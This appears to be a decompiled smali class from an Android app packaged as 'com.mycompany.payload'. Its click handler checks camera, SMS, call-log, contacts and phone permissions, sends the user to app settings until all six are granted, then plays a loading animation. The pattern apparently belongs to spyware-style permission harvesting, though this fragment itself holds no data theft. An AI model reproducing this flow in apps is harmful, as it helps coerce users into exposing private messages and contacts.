.class Lcom/mycompany/payload/MainActivity$100000001;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/mycompany/payload/MainActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation

.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/mycompany/payload/MainActivity$100000001$100000000;
    }
.end annotation


# instance fields
.field private final this$0:Lcom/mycompany/payload/MainActivity;

.field private final val$lv:Lcom/airbnb/lottie/LottieAnimationView;

.field private final val$sp:Landroid/widget/Spinner;


# direct methods
.method constructor <init>(Lcom/mycompany/payload/MainActivity;Landroid/widget/Spinner;Lcom/airbnb/lottie/LottieAnimationView;)V
    .locals 7

    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v3, p3

    move-object v5, v0

    invoke-direct {v5}, Ljava/lang/Object;-><init>()V

    move-object v5, v0

    move-object v6, v1

    iput-object v6, v5, Lcom/mycompany/payload/MainActivity$100000001;->this$0:Lcom/mycompany/payload/MainActivity;

    move-object v5, v0

    move-object v6, v2

    iput-object v6, v5, Lcom/mycompany/payload/MainActivity$100000001;->val$sp:Landroid/widget/Spinner;

    move-object v5, v0

    move-object v6, v3

    iput-object v6, v5, Lcom/mycompany/payload/MainActivity$100000001;->val$lv:Lcom/airbnb/lottie/LottieAnimationView;

    return-void
.end method

.method static access$0(Lcom/mycompany/payload/MainActivity$100000001;)Lcom/mycompany/payload/MainActivity;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/mycompany/payload/MainActivity$100000001;->this$0:Lcom/mycompany/payload/MainActivity;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/View;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 47
    move-object v0, p0

    move-object v1, p1

    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/MainActivity$100000001;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v7, "android.permission.CAMERA"

    invoke-virtual {v6, v7}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v6

    const/4 v7, 0x0

    if-ne v6, v7, :cond_0

    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/MainActivity$100000001;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v7, "android.permission.READ_SMS"

    invoke-virtual {v6, v7}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v6

    const/4 v7, 0x0

    if-ne v6, v7, :cond_0

    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/MainActivity$100000001;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v7, "android.permission.SEND_SMS"

    invoke-virtual {v6, v7}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v6

    const/4 v7, 0x0

    if-ne v6, v7, :cond_0

    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/MainActivity$100000001;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v7, "android.permission.CALL_PHONE"

    invoke-virtual {v6, v7}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v6

    const/4 v7, 0x0

    if-ne v6, v7, :cond_0

    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/MainActivity$100000001;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v7, "android.permission.READ_CALL_LOG"

    invoke-virtual {v6, v7}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v6

    const/4 v7, 0x0

    if-ne v6, v7, :cond_0

    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/MainActivity$100000001;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v7, "android.permission.READ_CONTACTS"

    invoke-virtual {v6, v7}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v6

    const/4 v7, 0x0

    if-ne v6, v7, :cond_0

    .line 56
    :goto_0
    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/MainActivity$100000001;->val$sp:Landroid/widget/Spinner;

    const/4 v7, 0x0

    invoke-virtual {v6, v7}, Landroid/widget/Spinner;->setVisibility(I)V

    .line 57
    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/MainActivity$100000001;->val$lv:Lcom/airbnb/lottie/LottieAnimationView;

    const/4 v7, 0x1

    invoke-virtual {v6, v7}, Lcom/airbnb/lottie/LottieAnimationView;->loop(Z)V

    .line 58
    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/MainActivity$100000001;->val$lv:Lcom/airbnb/lottie/LottieAnimationView;

    invoke-virtual {v6}, Lcom/airbnb/lottie/LottieAnimationView;->playAnimation()V

    .line 60
    new-instance v6, Landroid/os/Handler;

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    invoke-direct {v7}, Landroid/os/Handler;-><init>()V

    new-instance v7, Lcom/mycompany/payload/MainActivity$100000001$100000000;

    move-object v11, v7

    move-object v7, v11

    move-object v8, v11

    move-object v9, v0

    move-object v10, v0

    iget-object v10, v10, Lcom/mycompany/payload/MainActivity$100000001;->val$sp:Landroid/widget/Spinner;

    invoke-direct {v8, v9, v10}, Lcom/mycompany/payload/MainActivity$100000001$100000000;-><init>(Lcom/mycompany/payload/MainActivity$100000001;Landroid/widget/Spinner;)V

    const/16 v8, 0xbb8

    int-to-long v8, v8

    invoke-virtual {v6, v7, v8, v9}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    move-result v6

    return-void

    .line 50
    :cond_0
    new-instance v6, Landroid/content/Intent;

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"

    invoke-direct {v7, v8}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    move-object v3, v6

    .line 51
    const-string v6, "package"

    move-object v7, v0

    iget-object v7, v7, Lcom/mycompany/payload/MainActivity$100000001;->this$0:Lcom/mycompany/payload/MainActivity;

    invoke-virtual {v7}, Lcom/mycompany/payload/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x0

    check-cast v8, Ljava/lang/String;

    invoke-static {v6, v7, v8}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    move-object v4, v6

    .line 52
    move-object v6, v3

    move-object v7, v4

    invoke-virtual {v6, v7}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    move-result-object v6

    .line 53
    move-object v6, v0

    iget-object v6, v6, Lcom/mycompany/payload/MainActivity$100000001;->this$0:Lcom/mycompany/payload/MainActivity;

    move-object v7, v3

    invoke-virtual {v6, v7}, Lcom/mycompany/payload/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0
.end method
